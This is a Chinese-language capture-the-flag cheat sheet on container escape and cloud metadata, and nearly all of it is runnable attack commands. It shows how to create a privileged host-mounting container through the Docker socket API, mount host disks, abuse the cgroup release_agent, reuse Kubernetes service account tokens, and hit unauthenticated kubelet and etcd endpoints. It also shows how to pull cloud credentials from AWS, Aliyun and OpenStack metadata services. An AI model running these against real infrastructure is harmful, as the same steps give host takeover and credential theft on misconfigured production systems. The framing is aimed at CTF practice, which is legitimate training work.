# 容器逃逸 / 云元数据速查（多 flag 题高分段常靠这里）

## 0. 判断容器形态
```bash
cat /proc/self/cgroup | head -3       # docker/k8s 特征
ls /.dockerenv && echo docker
cat /proc/self/status | grep -i cap   # CapEff 高位权限多 → 特权容器
mount | grep -E 'docker.sock|hostPath|/proc|/sys'
```

## 1. docker.sock 挂载（最常见的逃逸面）
```bash
ls -la /var/run/docker.sock
# 有挂载就找 docker client 或直接打 HTTP API：
curl --unix-socket /var/run/docker.sock http://localhost/images/json
# 挂载宿主根目录起特权容器：
curl -X POST --unix-socket /var/run/docker.sock \
  -H 'Content-Type: application/json' \
  -d '{"Image":"alpine","Cmd":["chroot","/host","sh","-c","cat /flag* /challenge/flag* > /out.txt"],"Binds":["/:/host"],"Privileged":true}' \
  http://localhost/containers/create
curl -X POST --unix-socket /var/run/docker.sock http://localhost/containers/<ID>/start
# 无 client 且 API 不通时：find / -name docker 2>/dev/null；静态 client 可用 python 打 unix socket
```

## 2. 特权容器（--privileged / CapEff 全开）
```bash
# 方案A：挂载宿主磁盘
fdisk -l; mount /dev/vda1 /mnt && cat /mnt/flag* /mnt/challenge/flag*
# 方案B：cgroup release_agent（v1）
find / -writable -type d 2>/dev/null | grep cgroup
echo 1 > /tmp/cgrp/notify_on_release 路径写 release_agent 指向宿主执行脚本
```

## 3. k8s 特征
- serviceaccount token：`ls /var/run/secrets/kubernetes.io/serviceaccount/`
  - 有 token → 打 API：`curl -k -H "Authorization: Bearer $(cat token)" https://$KUBERNETES_SERVICE_HOST:443/api/v1/namespaces/$(cat namespace)/pods`
  - 高权 SA（create pod）→ 起挂载宿主路径的 pod 读宿主 flag
- kubelet 10250 未授权：`curl -k https://IP:10250/pods`、run 接口执行
- etcd 2379 未授权、dashboard 未授权 30000+

## 4. 云元数据（SSRF/出口在目标机器上打，不是解题容器）
```bash
curl http://169.254.169.254/latest/meta-data/                 # AWS
curl -H 'X-aliyun-ecs-metadata-token: x' http://100.100.100.200/latest/meta-data/  # 阿里云
curl http://169.254.169.254/openstack/latest/meta_data.json   # OpenStack
# AWS 临时凭证 → 用凭证读 S3/Secrets Manager（flag 常在桶对象/secret/用户数据）
```

## 5. 内网横向时的逃逸判断
- 拿下一台容器先查 cgroup/mount——是 k8s pod 就找 SA token，是 docker 就找 sock
- 宿主机特征：`ls /proc/1/ | head`、`ps aux` 看到 systemd/PID1 非容器进程 = 已在宿主
- 逃逸成功后第一件事：全盘 find flag + `bash /opt/tools/flag_sweep.sh`（经跳板 ssh 执行）
